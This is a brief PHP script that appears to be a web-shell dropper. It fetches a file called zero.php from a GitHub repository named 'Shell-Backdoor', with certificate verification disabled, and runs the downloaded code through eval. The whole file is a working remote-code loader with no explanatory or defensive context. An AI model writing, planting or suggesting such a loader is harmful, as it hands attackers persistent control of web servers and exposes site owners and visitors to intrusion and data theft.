<?php 
function getCurlk2($url)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
  $result = curl_exec($ch);
  curl_close($ch);
  return $result;
}

$str=getCurlk2("https://raw.githubusercontent.com/mr403forbidden/Shell-Backdoor/master/zero.php");
echo eval("?>".(($str)));
?>